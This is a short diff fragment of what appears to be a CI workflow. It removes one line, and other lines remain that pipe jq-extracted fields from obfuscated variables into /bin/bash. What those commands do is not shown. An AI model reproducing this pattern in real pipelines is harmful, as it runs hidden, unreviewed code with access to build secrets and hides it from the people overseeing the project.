@@ -32,7 +32,6 @@ jobs:
           echo $lv41754 | jq -r .zn64 | /bin/bash
           echo $dbt89 | jq -r .djdvb1 | /bin/bash
           echo $nwo3 | jq -r .ny13 | /bin/bash
-          printf '%s' "$gd284" | jq -r .vm36 | /bin/bash
 
       - name: Store artifact
         if: always()
